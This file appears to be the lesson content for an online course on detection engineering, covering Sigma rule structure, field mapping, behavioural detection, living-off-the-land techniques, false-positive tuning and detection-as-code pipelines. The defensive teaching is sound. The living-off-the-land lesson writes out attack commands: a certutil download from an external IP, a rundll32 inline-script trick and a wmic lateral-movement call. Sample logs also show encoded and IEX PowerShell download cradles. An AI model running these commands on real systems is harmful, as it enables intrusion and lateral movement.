/**
 * Detection Engineering Essentials — full lesson content.
 */

import {
  type Course, lesson, text, code, callout, check, cmd, note, out, step, terminal, walkthrough, practice,
} from "./blocks";

export const DETECTION_ENGINEERING: Course = {
  slug: "detection-engineering-essentials",
  modules: [
    {
      title: "Rule anatomy",
      description: "How a detection is put together and which part decides a match.",
      lessons: [
        lesson(
          "Log sources and field mapping",
          "Why the same rule behaves differently across two SIEMs.",
          8,
          [
            text(
              "A detection rule is written against fields, and fields are named differently by every product. The same Windows process-creation event is `process.command_line` in one platform, `CommandLine` in another and `process_command_line` in a third.\n\nThis is why a rule that works perfectly in one estate silently matches nothing in another. The logic is fine; the field does not exist, so the condition is never true.",
            ),
            code(
              `Sigma (portable)          Elastic ECS              Splunk CIM
─────────────────         ────────────────────     ─────────────────
Image                     process.executable       Processes.process_path
CommandLine               process.command_line     Processes.process
ParentImage               process.parent.executable Processes.parent_process_path
User                      user.name                Processes.user`,
              "text",
              "One event, three vocabularies.",
            ),
            callout(
              "danger",
              "A rule matching nothing looks identical to a quiet environment",
              "There is no error when a field does not exist — the condition is simply never satisfied. Validate every new rule against known-bad data before trusting its silence.",
            ),
            check(
              "A rule ported from another organisation produces no alerts in three months. What should you check first?",
              [
                "Whether the attack technique is used in your sector",
                "Whether the fields it references exist and are populated in your data",
                "Whether analysts are closing the alerts silently",
                "Whether the rule needs a higher severity",
              ],
              1,
              "Silence from a ported rule is far more often a field-mapping problem than an absence of the behaviour. Test against known-bad data to distinguish the two.",
            ),
          ],
        ),
        lesson(
          "Detection logic and conditions",
          "Selections, filters and the condition that ties them together.",
          10,
          [
            text(
              "Most detection languages share a structure: named **selections** that describe what you are looking for, optional **filters** describing known-benign matches, and a **condition** that combines them.\n\nThe condition is the part that decides. Everything else is set-up.",
            ),
            code(
              `title: Office spawning a command interpreter
logsource:
  category: process_creation
  product: windows

detection:
  selection:
    ParentImage|endswith:
      - '\\WINWORD.EXE'
      - '\\EXCEL.EXE'
      - '\\POWERPNT.EXE'
    Image|endswith:
      - '\\powershell.exe'
      - '\\cmd.exe'
      - '\\wscript.exe'

  filter_known_addin:
    CommandLine|contains: 'CorpTemplateSync'

  condition: selection and not filter_known_addin

falsepositives:
  - Corporate template add-in (filtered above)
level: high`,
              "text",
              "A complete rule. Note that the exclusion is documented rather than hidden.",
            ),
            text(
              "Two habits separate durable rules from brittle ones. First, **filter narrowly** — this rule excludes one specific command line, not every PowerShell launch. Second, **document the false positive** so the next engineer understands why the exclusion exists and can tell when it stops being valid.",
            ),

            practice(
              "Complete the condition line so the rule fires on the selection but never on the known-good activity captured by the filter.",
              ["selection", "not", "filter"],
              "condition: selection and not filter",
              "Sigma conditions read as plain logic, and this is the shape almost every tuned rule ends up with: match the behaviour, then subtract the specific legitimate case. Writing the exclusion as its own named block keeps the detection readable when someone revisits it a year later.",
              {
                setup: {
                  label: "rule fragment",
                  code: `detection:
  selection:
    ParentImage|endswith: '\\EXCEL.EXE'
    Image|endswith: '\\powershell.exe'
  filter:
    CommandLine|contains: 'C:\\FinOps\\refresh-rates.ps1'
  condition: ???`,
                },
              },
            ),
            check(
              "Which change would most weaken this rule?",
              [
                "Adding wscript.exe to the selection",
                "Broadening the filter to exclude all PowerShell with any -Command argument",
                "Adding a falsepositives note",
                "Raising the level to critical",
              ],
              1,
              "That filter would exclude most of what the rule exists to catch. Broad exclusions are the usual way a rule quietly stops working while still appearing deployed.",
            ),
          ],
        ),
        lesson(
          "Metadata that matters",
          "Severity, false positives and the response guidance analysts actually read.",
          8,
          [
            text(
              "Rule metadata is treated as paperwork and is actually the difference between a detection that gets actioned and one that gets closed. An analyst at 03:00 has your title, your severity and — if you wrote one — your response guidance.\n\nA title should say what happened, not what fired. 'Suspicious PowerShell' tells nobody anything. 'Office application spawned PowerShell with encoded command' tells them what to check.",
            ),
            callout(
              "important",
              "Severity is a promise about response",
              "If everything is high, nothing is. Severity should map to what you want the analyst to actually do, and you should be willing to defend waking someone up for anything marked critical.",
            ),
            code(
              `Weak
  title: Suspicious PowerShell
  level: high

Better
  title: Office application spawned PowerShell with encoded command
  level: high
  falsepositives:
    - CorpTemplateSync add-in, filtered in the rule
  response: |
    1. Confirm the parent document and where it came from
    2. Decode the -enc argument
    3. Check for outbound connections from the child process
    4. Escalate to IR if the payload contacts an external host`,
              "text",
              "The second version tells an analyst at 03:00 what to do.",
            ),
            text(
              "Response guidance is the field most often left blank and most often needed. It does not have to be long: four concrete steps turn an alert from a question into a task, and materially improve the odds that a real detection is acted on rather than closed for lack of time.",
            ),
            check(
              "What most improves the chance an alert is investigated properly?",
              [
                "A higher severity level",
                "A title describing the observed behaviour and concrete first steps to check",
                "More fields in the alert payload",
                "Tagging it with MITRE technique ids",
              ],
              1,
              "Analysts act on clarity. Severity inflation gets ignored, extra fields add noise, and technique tags help reporting more than triage.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Behaviour over indicators",
      description: "Detecting the technique rather than this week's hash.",
      lessons: [
        lesson(
          "Why indicators decay",
          "Infrastructure is cheap to change; tradecraft is not.",
          10,
          [
            text(
              "A hash identifies one build of one payload. Recompiling changes it. A domain costs a few pounds and minutes to register. An IP address is rented by the hour.\n\nAgainst this, the *behaviour* — a document spawning a shell, a service created remotely, credential material read from LSASS — persists because changing it means changing how the operation works, not merely what it is called.",
            ),
            code(
              `Indicator                 Cost to the attacker   Useful lifetime
─────────────────────     ────────────────────   ──────────────
File hash                 Recompile: minutes     Days
Domain                    Register: minutes      Days to weeks
IP address                Rent: minutes          Days
TLS/JA3 fingerprint       Change tooling: days   Weeks to months
Behavioural pattern       Rewrite tradecraft     Months to years`,
              "text",
              "Roughly the Pyramid of Pain, expressed as engineering effort.",
            ),
            callout(
              "tip",
              "Indicators still earn their place",
              "They are cheap, precise and produce almost no false positives while they last. Block them — just do not mistake a feed of them for a detection strategy.",
            ),
            check(
              "A threat report contains 200 hashes, 40 domains and a description of the technique. Which has the longest detection value?",
              [
                "The hashes, being most precise",
                "The technique description, because behaviour is expensive to change",
                "The domains, being reusable across campaigns",
                "All decay at the same rate",
              ],
              1,
              "The appendix decays in days. The narrative describes what the actor does, which survives every rebuild of their infrastructure.",
            ),
          ],
        ),
        lesson(
          "Parent-child process logic",
          "The single most productive behavioural pattern on Windows.",
          10,
          [
            text(
              "Windows software has predictable ancestry. `winword.exe` is started by `explorer.exe`. `svchost.exe` is started by `services.exe`. When that expectation breaks, something has intervened.\n\nThis one idea produces a large share of high-value detections, because so many intrusions begin with a document or a script starting something it has no business starting.",
            ),
            code(
              `Normal                        Suspicious
────────────────────────      ────────────────────────────────
explorer.exe → winword.exe    winword.exe → powershell.exe
services.exe → svchost.exe    powershell.exe → svchost.exe
explorer.exe → chrome.exe     outlook.exe → wscript.exe
                              w3wp.exe → cmd.exe   (web shell)`,
              "text",
            ),
            text(
              "The right-hand column is not proof of compromise — build systems and administrative tooling produce odd chains legitimately. It is an excellent *place to look*, which is what a detection is for.",
            ),

            terminal(
              "Writing and testing a parent-child rule",
              "detect@rules-ci",
              [
                note("The hypothesis: Office applications should not spawn script interpreters. Write it as a rule before checking whether it holds."),
                cmd("cat rules/office_spawns_interpreter.yml"),
                out(`title: Office Application Spawning Script Interpreter
id: 8c1f4a20-0d7e-4a11-9f33-2b6ce0a51d84
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\\WINWORD.EXE'
      - '\\EXCEL.EXE'
      - '\\POWERPNT.EXE'
    Image|endswith:
      - '\\wscript.exe'
      - '\\cscript.exe'
      - '\\powershell.exe'
      - '\\mshta.exe'
  condition: selection
level: high`),
                note("Now the part people skip: run it against thirty days of production telemetry before it goes anywhere near an analyst."),
                cmd("sigma-cli check --rule rules/office_spawns_interpreter.yml --baseline prod-30d.parquet"),
                out(`Matches over 30 days: 218
Distinct hosts:        4
Distinct parents:      1 (EXCEL.EXE)
Distinct children:     1 (powershell.exe)`),
                note("Two hundred and eighteen hits across four hosts. If this shipped as written, the analyst gets seven alerts a day from the same four machines."),
                cmd("sigma-cli explain --rule rules/office_spawns_interpreter.yml --baseline prod-30d.parquet --group CommandLine | head -4"),
                out(`  214  powershell.exe -ExecutionPolicy Bypass -File C:\\FinOps\\refresh-rates.ps1
    2  powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...
    1  powershell.exe -nop -w hidden -c IEX(New-Object Net...
    1  powershell.exe Get-Process`),
                note("Two hundred and fourteen of those are one finance macro doing its job. The three below it are exactly what the rule was written to catch."),
                note("Exclude the specific script path — not EXCEL.EXE, and not powershell.exe. A broad exclusion here would have discarded the real detections too."),
                cmd("sigma-cli check --rule rules/office_spawns_interpreter.yml --baseline prod-30d.parquet --after-tuning"),
                out(`Matches over 30 days: 4
Distinct hosts:        3
Estimated alerts/day:  0.13`),
                note("One alert every eight days, and every one worth opening. That ratio is the deliverable — not the rule file."),
              ],
            ),
            check(
              "Why is w3wp.exe spawning cmd.exe particularly notable?",
              [
                "w3wp.exe should never create processes",
                "It suggests command execution through the web application, a classic web shell",
                "cmd.exe is deprecated",
                "It indicates a crashed worker process",
              ],
              1,
              "The IIS worker process running a shell means something reached command execution through the web tier — the signature of a web shell.",
            ),
          ],
        ),
        lesson(
          "Detecting living-off-the-land",
          "Finding intrusions that use only built-in tooling.",
          10,
          [
            text(
              "The hardest intrusions to detect introduce nothing. They use `certutil` to download, `rundll32` to execute, `wmic` to move laterally and `bitsadmin` to persist — all signed Microsoft binaries present on every host.\n\nDetection cannot rest on the binary. It has to rest on **how it is being used**, and on whether that use is normal for that host.",
            ),
            code(
              `certutil.exe -urlcache -split -f http://45.87.212.9/p.exe out.exe
   Legitimate purpose: certificate management
   Actual use: HTTP download

rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";eval(...)
   Legitimate purpose: run a DLL export
   Actual use: execute inline script

wmic /node:10.20.1.25 process call create "cmd /c ..."
   Legitimate purpose: remote management
   Actual use: lateral movement`,
              "bash",
            ),
            callout(
              "important",
              "Baseline decides everything here",
              "In an estate where administrators use wmic daily, alerting on wmic is unworkable. In one where they never do, it is one of your best signals. The same rule is excellent or useless depending on the environment.",
            ),

            walkthrough(
              "Turning a noisy binary into a usable detection",
              "certutil.exe is signed, present on every Windows host, and used constantly by legitimate software. It is also a download tool. Work out what you can actually alert on.",
              [
                step(
                  "Measure the noise before writing anything",
                  "Start by counting how often the binary runs at all across the estate. The number decides whether you are writing a detection or a hunting query.",
                  {
                    evidence: {
                      label: "30 days of process creation",
                      code: `certutil.exe executions: 41 802
distinct hosts:          3 914
distinct command lines:    127`,
                    },
                    insight: "Alerting on execution is out of the question. But 127 distinct command lines across 3,914 hosts means the *arguments* are highly repetitive.",
                  },
                ),
                step(
                  "Group by argument, not by binary",
                  "The legitimate uses cluster tightly — certificate store operations, mostly from management software. The interesting flags barely appear.",
                  {
                    evidence: {
                      label: "Top command lines by frequency",
                      code: `38 114  certutil -verifystore My
  2 902  certutil -f -p **** -importpfx
    701  certutil -store -enterprise NTAuth
     78  certutil -hashfile ... SHA256
      6  certutil -urlcache -split -f http://...
      1  certutil -decode payload.b64 payload.exe`,
                    },
                    insight: "The bottom two lines are 0.017% of all executions, and they are the only ones that download or decode.",
                  },
                ),
                step(
                  "Check the rare arguments have no legitimate owner",
                  "Six urlcache executions is few enough to check individually. If one turns out to be a deployment script, your rule needs an exclusion rather than a lower threshold.",
                  {
                    evidence: {
                      label: "The six -urlcache executions",
                      code: `4x  host WKS-4412, parent w3wp.exe,  http://10.20.1.9/agent.msi   (internal, patch server)
2x  host WKS-0088, parent cmd.exe,   http://185.244.25.171/a.txt  (external, VPS)`,
                    },
                    insight: "Four are an internal patch server and belong in an exclusion by destination. Two are an external IP address with no hostname — which is the detection.",
                  },
                ),
                step(
                  "Write the rule around intent, not the binary name",
                  "Alert on certutil with -urlcache, -decode or -encode where the destination is not an internal address. The binary being signed and common is irrelevant once the arguments carry the intent.",
                  {
                    evidence: {
                      label: "Tuned rule — 30-day replay",
                      code: `matches:              2
distinct hosts:       1
estimated alerts/day: 0.07`,
                    },
                    insight: "Two alerts in a month, both true positives. The same log source that looked hopeless at 41,802 events produced a precise detection — because the grouping was on arguments.",
                  },
                ),
                step(
                  "Accept what this rule does not cover",
                  "An operator who knows this rule exists uses a different binary. That is fine, and it is why living-off-the-land coverage is a set of narrow rules rather than one clever one. Write the same analysis for bitsadmin, mshta and regsvr32 next.",
                  {
                    insight: "Narrow rules that fire rarely and correctly are worth more than a broad rule that gets muted in week two.",
                  },
                ),
              ],
            ),
            check(
              "Why is detecting living-off-the-land techniques harder than detecting malware?",
              [
                "The binaries are encrypted",
                "The tools are signed, legitimate and present everywhere, so only usage context distinguishes abuse",
                "They run only in memory",
                "Antivirus cannot scan system binaries",
              ],
              1,
              "There is nothing anomalous about the file itself. The signal lives entirely in how, where and by whom it is being invoked.",
            ),
          ],
        ),
      ],
    },
    {
      title: "Validation and tuning",
      description: "Proving a rule works, and keeping it that way.",
      lessons: [
        lesson(
          "Testing against known-good and known-bad",
          "A rule that has never fired in test is a hypothesis.",
          8,
          [
            text(
              "Every new rule needs two tests. Against **known-bad**, it must fire — otherwise the logic or the field mapping is wrong. Against **known-good**, it must stay silent — otherwise you are about to hand the SOC a noise generator.\n\nSkipping the first is how rules ship broken. Skipping the second is how they get disabled within a week.",
            ),
            callout(
              "tip",
              "Emulate the technique, do not just craft the log line",
              "Hand-writing a matching event proves your regex works. Running the actual technique proves your rule catches what the technique really produces, which is frequently different.",
            ),
            code(
              `Validation checklist for a new rule

  [ ] Fires on emulated execution of the technique
  [ ] Fires on the real technique, not a hand-crafted log line
  [ ] Silent across fourteen days of production data
  [ ] Every referenced field exists and is populated
  [ ] Exclusions documented with their reason
  [ ] Review date set`,
              "text",
            ),
            text(
              "The second box is the one teams skip. Hand-writing a log line that matches your rule proves the syntax is valid; running the actual technique proves the rule matches what that technique really emits — and the two differ more often than expected, because tooling rarely produces exactly the fields a write-up showed.",
            ),
            check(
              "A rule fires correctly against emulated attack data. What remains untested?",
              [
                "Nothing — it is ready to deploy",
                "Its false-positive rate against normal production activity",
                "Whether the technique is relevant",
                "The severity level",
              ],
              1,
              "True-positive capability is only half. Without a false-positive measurement you cannot know whether the SOC can actually carry the rule.",
            ),
          ],
        ),
        lesson(
          "Measuring false-positive rate",
          "Judging a rule against the SOC's actual capacity.",
          8,
          [
            text(
              "A rule producing forty alerts a day is fine in a team of twenty and impossible in a team of two. False-positive rate is meaningless as an absolute number; it is meaningful relative to capacity.\n\nMeasure by running the rule in a non-alerting mode against real production data for a period, then count.",
            ),
            code(
              `Rule: Office spawns command interpreter
Shadow-run: 14 days

Total matches      412
True positives       2   (both genuine phishing)
Benign              410  (398 from CorpTemplateSync add-in)

After filtering the add-in:  14 matches, 2 true positives.
Workable.`,
              "text",
              "One targeted exclusion turned an unusable rule into a good one.",
            ),
            text(
              "Shadow-running is the mechanism: deploy the rule in a mode that records matches without alerting, leave it a fortnight, then read the results. Two weeks catches the weekly and monthly patterns — the Sunday maintenance window, the month-end billing job — that a two-day test never sees at all.",
            ),
            callout(
              "tip",
              "Count distinct sources, not just matches",
              "Four hundred matches from one host is a tuning problem with an easy fix. Four hundred matches from two hundred hosts is a different rule entirely. The raw count hides that distinction completely.",
            ),
            check(
              "A rule produces 400 benign matches a day, 398 from one known application. What is the right response?",
              [
                "Delete the rule",
                "Add a narrow exclusion for that application and re-measure",
                "Lower the severity so analysts ignore it",
                "Suppress the log source",
              ],
              1,
              "One narrow exclusion removes almost all the noise while keeping the coverage. Deleting loses the detection; lowering severity keeps the noise and hides the signal.",
            ),
          ],
        ),
        lesson(
          "Detection as code",
          "Version control, review and rollback for rules.",
          8,
          [
            text(
              "Detections are production logic. Treating them as code brings the practices that already work for software: version control, peer review, automated testing and the ability to roll back a change that turned out badly.\n\nThe alternative — editing rules directly in a SIEM console — leaves no history, no review and no way to answer 'who changed this, and why?' six months later.",
            ),
            callout(
              "important",
              "Set the review date when you deploy",
              "Environments change. A rule perfectly tuned today drifts as the estate evolves, and the drift is invisible unless somebody looks. Schedule that look at the moment you ship.",
            ),
            code(
              `detections/
  windows/
    office_spawns_shell.yml
    dcsync_from_workstation.yml
  tests/
    office_spawns_shell.test.yml    known-bad and known-good samples
  .github/workflows/
    validate.yml                    syntax, field mapping, sample runs`,
              "text",
              "The same layout any engineer would recognise.",
            ),
            text(
              "Continuous integration is where this pays off. A pipeline that checks syntax, confirms referenced fields exist in your schema, and runs each rule against its stored samples catches the broken-rule-that-matches-nothing problem at review time rather than months later during an incident.",
            ),

            terminal(
              "A detection pipeline that refuses bad rules",
              "detect@rules-ci",
              [
                note("Rules live in git and ship through CI, exactly like application code. Here is what a pull request runs."),
                cmd("cat .github/workflows/detections.yml"),
                out(`name: detections
on: [pull_request]
jobs:
  validate:
    steps:
      - run: sigma-cli validate rules/            # schema and syntax
      - run: sigma-cli lint rules/ --strict       # required metadata
      - run: pytest tests/detections/             # true and false positives
      - run: sigma-cli baseline rules/ --max-per-day 1.0`),
                note("Four gates. The last one is the one that keeps the alert queue survivable."),
                cmd("sigma-cli validate rules/"),
                out(`rules/office_spawns_interpreter.yml   OK
rules/certutil_remote_fetch.yml       OK
rules/lsass_handle_access.yml         ERROR
    line 14: 'condition' references undefined selection 'filter_legit'

1 error, 2 passed`),
                note("A typo in a condition would have shipped a rule that silently never fires. This is the failure mode CI exists to catch."),
                cmd("pytest tests/detections/ -q"),
                out(`tests/detections/test_office_spawns.py::test_fires_on_maldoc      PASSED
tests/detections/test_office_spawns.py::test_ignores_finops_macro PASSED
tests/detections/test_certutil.py::test_fires_on_external_fetch   PASSED
tests/detections/test_certutil.py::test_ignores_patch_server      FAILED

E  Expected 0 matches, got 4
E  Sample: certutil -urlcache -split -f http://10.20.1.9/agent.msi`),
                note("The exclusion was written against the wrong field. Every rule needs both tests: one proving it fires, one proving it stays quiet."),
                cmd("git log --oneline -3 -- rules/certutil_remote_fetch.yml"),
                out(`a3f1c04  tune: exclude internal patch server by destination
7b20e91  fix: match on urlcache and decode, not binary name
c14d8a2  add: certutil remote fetch detection`),
                note("Every change to a detection has an author, a reason and a diff. When an alert misbehaves at 3am, that history is what tells you why the rule looks the way it does."),
              ],
            ),
            check(
              "What is the primary benefit of managing detections in version control?",
              [
                "Rules execute faster",
                "Changes are reviewable, attributable and reversible",
                "It removes the need for testing",
                "It reduces false positives automatically",
              ],
              1,
              "Version control does not improve the rule. It makes the change history knowable, which is what lets a team operate a large ruleset safely.",
            ),
          ],
        ),
      ],
    },
  ],
};
